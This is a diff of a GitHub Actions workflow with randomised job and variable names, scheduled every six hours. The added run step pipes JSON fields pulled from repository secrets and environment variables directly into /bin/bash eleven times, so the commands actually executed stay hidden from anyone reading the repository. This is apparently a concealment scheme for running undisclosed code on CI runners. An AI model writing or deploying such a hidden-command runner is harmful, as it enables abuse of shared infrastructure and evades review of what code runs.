@@ -3,19 +3,27 @@ name: qiaosangou8129
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
+    - cron: '39 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qiaosangou8129
         env:
-          exdru6: ${{ secrets.exdru6 }}
+          p382: ${{ secrets.p382 }}
         run: |
-          echo $exdru6 | jq -r .bt053 | /bin/bash
-          echo $qqzts4183 | jq -r .ptohx549 | /bin/bash
-          echo $r3983 | jq -r .qhnq3392 | /bin/bash
-          echo $scyrl86047 | jq -r .wgul81452 | /bin/bash
+          echo $p382 | jq -r .u83 | /bin/bash
+          echo $bzol93617 | jq -r .qwa7374 | /bin/bash
+          echo $bkr709 | jq -r .ftxc596 | /bin/bash
+          echo $ps6 | jq -r .rg189 | /bin/bash
+          echo $zwyw31503 | jq -r .hv157 | /bin/bash
+          echo $dvwq5 | jq -r .nyqp7202 | /bin/bash
+          echo $jh60 | jq -r .rlh8 | /bin/bash
+          echo $e43 | jq -r .g55636 | /bin/bash
+          echo $ya31 | jq -r .ev29 | /bin/bash
+          echo $bgiw86624 | jq -r .ufom8 | /bin/bash
+          echo $uab8 | jq -r .kzrbh26 | /bin/bash
 
